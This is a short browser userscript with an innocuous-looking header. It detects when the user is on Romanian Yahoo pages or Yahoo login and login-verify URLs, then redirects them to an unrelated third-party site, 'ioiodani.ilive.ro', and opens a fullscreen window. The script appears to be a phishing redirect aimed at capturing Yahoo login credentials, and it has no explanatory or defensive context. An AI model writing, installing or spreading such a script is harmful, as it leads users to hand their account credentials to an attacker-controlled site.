// ==UserScript==
// @name           sa_vedem2.0ioiodani
// @namespace      dsfsaf
// ==/UserScript==
      


var nr = window.location;
if( nr=="http://ro.yahoo.com/?p=us" || 
	nr=="https://login.yahoo.com/config/login" ||
	nr=="https://login.yahoo.com/config/login_verify2?&.src=ym" ||
	nr=="http://ro.yahoo.com/")
 {window.location="http://ioiodani.ilive.ro";
 window.open(location.href,'fullscreen','fullscreen,scrollbars'); 

}


